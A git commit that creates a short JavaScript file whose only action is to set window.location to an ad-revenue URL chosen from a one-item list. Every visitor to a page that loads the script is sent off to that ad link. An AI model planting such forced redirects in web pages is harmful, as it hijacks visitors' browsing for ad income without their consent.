d05af69af277967376d180edc34149fce936adf2
bebekcebok <84526808+bebekcebok@users.noreply.github.com>
2021-05-20 23:54:58 +0800

    Create berakcebong.js

---
+++ berakcebong.js
@@ -0,0 +1,5 @@
+var dataUrl = [
+'https://www.achievablecpmrevenue.com/niv8euxw9?key=a2a220ca123687ebfc81a837995946ea'  
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
